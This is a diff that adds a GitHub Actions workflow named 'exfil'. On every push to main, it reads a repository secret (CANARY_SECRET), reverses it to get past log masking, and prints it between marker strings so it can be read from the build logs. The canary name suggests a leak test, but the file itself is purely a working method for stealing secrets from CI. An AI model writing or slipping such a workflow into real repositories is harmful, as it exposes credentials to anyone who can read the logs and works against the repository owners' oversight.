@@ -1,0 +1,14 @@
+name: exfil
+on:
+  push:
+    branches: [main]
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo LEAKSTART
+          printf "%s" "$S" | rev
+          echo LEAKEND
+        env:
+          S: ${{ secrets.CANARY_SECRET }}
